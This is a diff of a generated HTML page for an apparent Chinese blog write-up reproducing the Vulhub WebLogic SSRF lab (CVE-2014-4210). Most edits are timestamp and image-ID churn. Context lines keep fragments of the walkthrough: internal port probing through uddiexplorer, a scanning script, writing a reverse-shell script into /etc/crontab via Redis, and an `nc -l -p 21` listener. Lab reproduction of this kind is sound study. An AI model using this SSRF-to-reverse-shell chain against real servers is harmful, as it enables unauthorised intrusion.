@@ -10,18 +10,18 @@
     <title>CVE-2014-4210_Weblogic SSRF漏洞 - x7peeps</title>
     <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub%E5%AE%9E%E9%AA%8C_Weblogic_SSRF%E6%BC%8F%E6%B4%9E/index.xml" rel="alternate" type="application/rss+xml" title="CVE-2014-4210_Weblogic SSRF漏洞 - x7peeps"><link rel="icon" href="/images/head.png" type="image/png">
     <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
-    <link href="/css/fontawesome-all.min.css?1690855899" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690855899" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1690855899" rel="stylesheet">
-    <link href="/css/auto-complete.css?1690855899" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690855899" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1690855899" rel="stylesheet">
-    <link href="/css/fonts.css?1690855899" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690855899" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1690855899" rel="stylesheet">
-    <link href="/css/theme-auto.css?1690855899" rel="stylesheet" id="variant-style">
-    <link href="/css/variant.css?1690855899" rel="stylesheet">
-    <link href="/css/print.css?1690855899" rel="stylesheet" media="print">
-    <link href="/css/ie.css?1690855899" rel="stylesheet">
-    <script src="/js/url.js?1690855899"></script>
-    <script src="/js/variant.js?1690855899"></script>
+    <link href="/css/fontawesome-all.min.css?1690856273" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690856273" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1690856273" rel="stylesheet">
+    <link href="/css/auto-complete.css?1690856273" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690856273" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1690856273" rel="stylesheet">
+    <link href="/css/fonts.css?1690856273" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690856273" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1690856273" rel="stylesheet">
+    <link href="/css/theme-auto.css?1690856273" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1690856273" rel="stylesheet">
+    <link href="/css/print.css?1690856273" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1690856273" rel="stylesheet">
+    <script src="/js/url.js?1690856273"></script>
+    <script src="/js/variant.js?1690856273"></script>
     <script>
       // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
       // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
@@ -75,10 +75,10 @@
 <h1 id="cve-2014-4210_weblogic-ssrf漏洞">CVE-2014-4210_Weblogic SSRF漏洞</h1>
 
 <p>
-<a href="#image-33502ea66cc458cd840e62654baca674" class="lightbox-link">
+<a href="#image-2172286887bc70b751fd44778a0b4086" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/11e411c2b9412e6d6c552b53b74eab6c.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-33502ea66cc458cd840e62654baca674">
+<a href="javascript:history.back();" class="lightbox" id="image-2172286887bc70b751fd44778a0b4086">
 <img src="http://image.xtpeeps.cn/11e411c2b9412e6d6c552b53b74eab6c.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <blockquote>
@@ -90,10 +90,10 @@
 docker-compose up -d
 dockerps</code></pre></div><p>访问http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用。</p>
 <p>
-<a href="#image-7038223240f0af6fe198b3bd89d21fbf" class="lightbox-link">
+<a href="#image-78d65fc94a22977874a50fbd1a0fac1e" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/f9260f1183ab1e2508fe5969234d3320.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-7038223240f0af6fe198b3bd89d21fbf">
+<a href="javascript:history.back();" class="lightbox" id="image-78d65fc94a22977874a50fbd1a0fac1e">
 <img src="http://image.xtpeeps.cn/f9260f1183ab1e2508fe5969234d3320.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <h5 id="ssrf漏洞测试">SSRF漏洞测试</h5>
@@ -105,18 +105,18 @@ Accept-Language: en
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
 Connection: close</code></pre></div><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。
 
-<a href="#image-cf83c0a3470203b820376344dea9edc9" class="lightbox-link">
+<a href="#image-ad849599dfd62be8bbbf2f8bb3b8b689" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/6abe23cdcffe896d3f60be3855b809d7.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-cf83c0a3470203b820376344dea9edc9">
+<a href="javascript:history.back();" class="lightbox" id="image-ad849599dfd62be8bbbf2f8bb3b8b689">
 <img src="http://image.xtpeeps.cn/6abe23cdcffe896d3f60be3855b809d7.png" alt="" class="lightbox-image" loading="lazy">
 </a>
 修改为一个不存在的端口，将会返回could not connect over HTTP to server。
 
-<a href="#image-8a8893726dc22cb7d8f0036af8bc5198" class="lightbox-link">
+<a href="#image-e4dbaeb24b9921b93fd7c462047c5030" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/bed861278b1db3c25770caa4d7b65bd3.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-8a8893726dc22cb7d8f0036af8bc5198">
+<a href="javascript:history.back();" class="lightbox" id="image-e4dbaeb24b9921b93fd7c462047c5030">
 <img src="http://image.xtpeeps.cn/bed861278b1db3c25770caa4d7b65bd3.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <p>A: 10.0.0.0~10.255.255.255即10.0.0.0/8<br>
@@ -171,10 +171,10 @@ if __name__ == &#39;__main__&#39;:
         ite_ip(ip)
     else:
         print &#34;no ip&#34;</code></pre></div><div class="wrap-code highlight"><pre tabindex="0"><code>python weblogic_ssrf.py --url http://192.168.199.128:7001</code></pre></div><p>
-<a href="#image-5c7a59b3a261360cc4a247528fd4a923" class="lightbox-link">
+<a href="#image-a243bd4647277e78415425f3d10ae9c9" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/f34cae1d0ffcc5f72a960440a37b660d.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-5c7a59b3a261360cc4a247528fd4a923">
+<a href="javascript:history.back();" class="lightbox" id="image-a243bd4647277e78415425f3d10ae9c9">
 <img src="http://image.xtpeeps.cn/f34cae1d0ffcc5f72a960440a37b660d.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>docker ps</code></pre></div><p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
@@ -202,18 +202,18 @@ Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http
 DNT: 1
 Connection: close
 Upgrade-Insecure-Requests: 1</code></pre></div><p>
-<a href="#image-44a648f20b03e63599f3bd491d470c32" class="lightbox-link">
+<a href="#image-9fa779a4f1f537f54d5bc81c2adb6765" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/0496cb53f54a17f68c95ba265fda2f9d.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-44a648f20b03e63599f3bd491d470c32">
+<a href="javascript:history.back();" class="lightbox" id="image-9fa779a4f1f537f54d5bc81c2adb6765">
 <img src="http://image.xtpeeps.cn/0496cb53f54a17f68c95ba265fda2f9d.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <p>接着靶机上getshell，<code>nc -l -p 21</code>获取反弹shell。成功。</p>
 <p>
-<a href="#image-f568a5de6688e12496250a268c4f0e62" class="lightbox-link">
+<a href="#image-14fdfc26b71834beb76fcb5b1ebd016f" class="lightbox-link">
 <img src="http://image.xtpeeps.cn/11e411c2b9412e6d6c552b53b74eab6c.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-f568a5de6688e12496250a268c4f0e62">
+<a href="javascript:history.back();" class="lightbox" id="image-14fdfc26b71834beb76fcb5b1ebd016f">
 <img src="http://image.xtpeeps.cn/11e411c2b9412e6d6c552b53b74eab6c.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <h4 id="释放靶场">释放靶场</h4>
@@ -240,12 +240,12 @@ Upgrade-Insecure-Requests: 1</code></pre></div><p>
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.min.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1690855900" defer></script>
-        <script src="/js/search.js?1690855900" defer></script>
+        <script src="/js/auto-complete.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.min.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1690856274" defer></script>
+        <script src="/js/search.js?1690856274" defer></script>
       </div>
       <div id="content-wrapper" class="highlightable">
         <ul class="topics enlarge morespace collapsible-menu">
@@ -343,7 +343,7 @@ Upgrade-Insecure-Requests: 1</code></pre></div><p>
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/index.html" class=""><input type="checkbox" id="section-be882d7838b29bb55035a73606bd5fad" aria-controls="subsections-be882d7838b29bb55035a73606bd5fad"><label for="section-be882d7838b29bb55035a73606bd5fad"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 操作系统</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/index.html">操作系统<i class="fas fa-check read-icon"></i></a><ul id="subsections-be882d7838b29bb55035a73606bd5fad" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/index.html" class=""><input type="checkbox" id="section-0a43e999527d8431e07a6c83274453d0" aria-controls="subsections-0a43e999527d8431e07a6c83274453d0"><label for="section-0a43e999527d8431e07a6c83274453d0"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu windows</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/index.html">windows<i class="fas fa-check read-icon"></i></a><ul id="subsections-0a43e999527d8431e07a6c83274453d0" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/index.html" class=""><input type="checkbox" id="section-4b5256e8689ed2826632ee3c944d042e" aria-controls="subsections-4b5256e8689ed2826632ee3c944d042e"><label for="section-4b5256e8689ed2826632ee3c944d042e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Powershell</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/index.html">Powershell<i class="fas fa-check read-icon"></i></a><ul id="subsections-4b5256e8689ed2826632ee3c944d042e" class="morespace collapsible-menu">
-          <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsbwindow%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html" class=""><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsbwindow%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html">[MS-GPSB]Window核心协议-安全扩展协议<i class="fas fa-check read-icon"></i></a></li></ul></li>
+          <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsb_window%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html" class=""><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsb_window%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html">[MS-GPSB]Window核心协议-安全扩展协议<i class="fas fa-check read-icon"></i></a></li></ul></li>
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/index.html" class=""><input type="checkbox" id="section-1dcf0d8ab382f88a0dec20aa11c7a8c6" aria-controls="subsections-1dcf0d8ab382f88a0dec20aa11c7a8c6"><label for="section-1dcf0d8ab382f88a0dec20aa11c7a8c6"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 组策略</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/index.html">组策略<i class="fas fa-check read-icon"></i></a><ul id="subsections-1dcf0d8ab382f88a0dec20aa11c7a8c6" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/sid%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6/index.html" class=""><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/sid%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6/index.html">SID安全标识符<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li></ul></li>
           <li data-nav-id="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html" class=""><input type="checkbox" id="section-6d101735907668b9565f2b24f0ce6829" aria-controls="subsections-6d101735907668b9565f2b24f0ce6829"><label for="section-6d101735907668b9565f2b24f0ce6829"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 渗透测试</span></label><a class="padding" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">渗透测试<i class="fas fa-check read-icon"></i></a><ul id="subsections-6d101735907668b9565f2b24f0ce6829" class="morespace collapsible-menu">
@@ -437,8 +437,8 @@ Upgrade-Insecure-Requests: 1</code></pre></div><p>
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1690855900" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1690855900" defer></script>
+    <script src="/js/clipboard.min.js?1690856274" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1690856274" defer></script>
     <script>
       function useMathJax( config ){
         if( !Object.assign ){
@@ -468,15 +468,15 @@ Upgrade-Insecure-Requests: 1</code></pre></div><p>
       useMathJax( JSON.parse("{}") );
     </script>
     <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-    <script src="/js/d3/d3-color.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1690855900" defer></script>
+    <script src="/js/d3/d3-color.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1690856274" defer></script>
     <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{ \"theme\": \"default\" }");
@@ -485,8 +485,8 @@ Upgrade-Insecure-Requests: 1</code></pre></div><p>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
     <script>
-      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1690855900  };
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1690856274  };
     </script>
-    <script src="/js/theme.js?1690855900" defer></script>
+    <script src="/js/theme.js?1690856274" defer></script>
   </body>
 </html>
